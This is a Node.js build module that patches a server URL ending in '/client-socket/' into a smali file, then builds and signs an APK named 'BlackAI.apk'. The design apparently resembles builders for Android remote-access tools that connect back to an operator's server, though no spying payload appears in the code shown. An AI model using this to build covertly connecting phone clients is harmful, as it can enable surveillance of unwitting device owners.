
const
    cp = require('child_process'),
    fs = require('fs'),
    CONST = require('./const');

// Thanks -> https://stackoverflow.com/a/19734810/7594368
// This function is a pain in the arse, so many issues because of it! -- hopefully this fix, fixes it!
function javaversion(callback) {
    let spawn = cp.spawn('java', ['-version']);
    let output = "";
    spawn.on('error', (err) => callback("Unable to spawn Java - " + err, null));
    spawn.stderr.on('data', (data) => {
        output += data.toString();
    });
    spawn.on('close', function (code) {
        let javaIndex = output.indexOf('java version');
        let openJDKIndex = output.indexOf('openjdk version');
        let javaVersion = (javaIndex !== -1) ? output.substring(javaIndex, (javaIndex + 27)) : "";
        let openJDKVersion = (openJDKIndex !== -1) ? output.substring(openJDKIndex, (openJDKIndex + 27)) : "";
        if (javaVersion !== "" || openJDKVersion !== "") {
            if (javaVersion.includes("1.8.0") || openJDKVersion.includes("1.8.0")) {
                spawn.removeAllListeners();
                spawn.stderr.removeAllListeners();
                return callback(null, (javaVersion || openJDKVersion));
            } else return callback("Wrong Java Version Installed. Detected " + (javaVersion || openJDKVersion) + ". Please use Java 1.8.0", undefined);
        } else return callback("Java Not Installed", undefined);
    });
}

function patchAPK(URI, PORT, cb) {
    fs.readFile(CONST.patchFilePath, 'utf8', function (err, data) {
        if (err) return cb('File Patch Error - READ')

        // Build the connection URL
        let connectionURL;
        
        // Check if we're in a Replit deployment environment or if the URI contains replit.app
        const isReplitDeployment = process.env.REPL_DEPLOYMENT === '1' || 
                                   process.env.REPLIT_DEPLOYMENT === '1' ||
                                   URI.includes('replit.app') ||
                                   URI.includes('repl.co');
        
        if (isReplitDeployment || PORT === '443') {
            // Use HTTPS for Replit deployments and standard HTTPS port
            connectionURL = "https://" + URI + "/client-socket/";
        } else if (PORT && PORT !== '80' && PORT !== '443') {
            connectionURL = "http://" + URI + ":" + PORT + "/client-socket/";
        } else {
            connectionURL = "https://" + URI + "/client-socket/";
        }

        console.log("Patching APK with URL:", connectionURL);

        // Find the old URL pattern in the smali file
        const httpIndex = data.indexOf("http://");
        const httpsIndex = data.indexOf("https://");
        const startIndex = (httpIndex !== -1 && httpsIndex !== -1) ? Math.min(httpIndex, httpsIndex) : 
                          (httpIndex !== -1 ? httpIndex : httpsIndex);
        
        if (startIndex === -1) {
            return cb('File Patch Error - Could not find URL pattern in smali file');
        }

        const modelIndex = data.indexOf("?model=", startIndex);
        if (modelIndex === -1) {
            return cb('File Patch Error - Could not find ?model= marker in smali file');
        }

        // Extract the old URL and replace it with the new one
        const oldURL = data.substring(startIndex, modelIndex);
        console.log("Replacing old URL:", oldURL);
        console.log("With new URL:", connectionURL);
        
        var result = data.replace(oldURL, connectionURL);

        fs.writeFile(CONST.patchFilePath, result, 'utf8', function (err) {
            if (err) return cb('File Patch Error - WRITE')
            else return cb(false)
        });
    });
}

function buildAPK(cb) {
    javaversion(function (err, version) {
        if (!err) {
            console.log("Starting APK build process...");
            cp.exec(CONST.buildCommand, (error, stdout, stderr) => {
                if (error) {
                    console.log("Build stdout:", stdout);
                    console.log("Build stderr:", stderr);
                    return cb('Build Command Failed - ' + error.message);
                }
                console.log("Build completed successfully");
                console.log("Build stdout:", stdout);
                
                // Check if build.apk was created
                const fs = require('fs');
                if (!fs.existsSync(CONST.apkBuildPath)) {
                    return cb('Build Command Failed - build.apk was not created');
                }
                
                console.log("Starting APK signing process for Android 14/15 compatibility...");
                
                const unsignedPath = CONST.apkBuildPath;
                const signedPath = CONST.apkSignedBuildPath;
                const keystorePath = require('path').join(__dirname, '../android.keystore');
                
                // Verify sign.jar exists
                if (!fs.existsSync(CONST.apkSign)) {
                    console.log("ERROR: sign.jar not found at:", CONST.apkSign);
                    return cb('sign.jar not found. Please ensure uber-apk-signer is installed.');
                }
                
                // Check sign.jar file size - uber-apk-signer should be 10MB+
                const signJarStats = fs.statSync(CONST.apkSign);
                console.log("sign.jar file size:", signJarStats.size, "bytes");
                if (signJarStats.size < 1000000) {
                    console.log("ERROR: sign.jar is too small (", signJarStats.size, "bytes). uber-apk-signer should be ~10-15MB");
                    console.log("Please download the correct uber-apk-signer JAR file:");
                    console.log("cd app/factory && wget https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar -O sign.jar");
                    return cb('sign.jar appears to be corrupted or is not uber-apk-signer. Please re-download it.');
                }
                
                // Clean up old signed APK if exists
                if (fs.existsSync(signedPath)) {
                    fs.unlinkSync(signedPath);
                    console.log("Removed old signed APK");
                }
                
                // Use uber-apk-signer with --allowResign flag for production signing
                // This creates a properly signed APK for Android 14/15
                const uberSignCmd = 'java -jar "' + CONST.apkSign + '" --apks "' + unsignedPath + '" --allowResign';
                
                console.log("Signing APK with uber-apk-signer for PRODUCTION (v1+v2+v3 schemes)...");
                console.log("This ensures compatibility with Android 4.4 through Android 15");
                console.log("Sign command:", uberSignCmd);
                console.log("Working directory:", require('path').dirname(unsignedPath));
                console.log("Java version in use:", version);
                
                cp.exec(uberSignCmd, { 
                    cwd: require('path').dirname(unsignedPath), 
                    maxBuffer: 10 * 1024 * 1024
                }, (signError, signStdout, signStderr) => {
                    const outputDir = require('path').dirname(unsignedPath);
                    const baseName = require('path').basename(unsignedPath, '.apk');
                    
                    console.log("=== uber-apk-signer output ===");
                    if (signStdout && signStdout.trim()) {
                        console.log("stdout:", signStdout);
                    }
                    if (signStderr && signStderr.trim()) {
                        console.log("stderr:", signStderr);
                    }
                    if (signError && signError.code !== 0) {
                        console.log("Exit code:", signError.code);
                        console.log("Error:", signError.message);
                    }
                    console.log("=== End of uber-apk-signer output ===");
                    
                    // uber-apk-signer creates files with pattern: input-aligned-debugSigned.apk or input-aligned-signed.apk
                    const possibleOutputNames = [
                        baseName + '-aligned-signed.apk',
                        baseName + '-aligned-debugSigned.apk',
                        baseName + '-debugSigned.apk',
                        baseName + '-signed.apk'
                    ];
                    
                    // Find which APK file was actually created
                    let foundOutputPath = null;
                    for (const possibleName of possibleOutputNames) {
                        const testPath = require('path').join(outputDir, possibleName);
                        if (fs.existsSync(testPath)) {
                            foundOutputPath = testPath;
                            console.log("Found signed APK at:", foundOutputPath);
                            break;
                        }
                    }
                    
                    if (foundOutputPath) {
                        // Move to our expected output name
                        fs.renameSync(foundOutputPath, signedPath);
                        
                        // Verify the signed APK size
                        const signedStats = fs.statSync(signedPath);
                        console.log("Signing completed successfully!");
                        console.log("Signed APK: BlackAI.apk");
                        console.log("APK Size:", Math.round(signedStats.size / 1024), "KB");
                        console.log("Signature schemes: v1+v2+v3 (Android 4.4-15 compatible)");
                        console.log("Installation: Uninstall any previous version COMPLETELY before installing this APK");
                        return cb(false);
                    } else {
                        console.log("ERROR: uber-apk-signer did not create expected output");
                        console.log("Files in directory:");
                        try {
                            const filesInDir = fs.readdirSync(outputDir);
                            filesInDir.forEach(file => {
                                if (file.endsWith('.apk')) {
                                    const stats = fs.statSync(require('path').join(outputDir, file));
                                    console.log("  -", file, "(", stats.size, "bytes)");
                                }
                            });
                        } catch (e) {
                            console.log("Could not list directory:", e.message);
                        }
                        
                        return cb('uber-apk-signer failed to create signed APK. The JAR file may be corrupted.');
                    }
                });
            });
        }
        else return cb(err);
    })
}

module.exports = {
    buildAPK,
    patchAPK
}
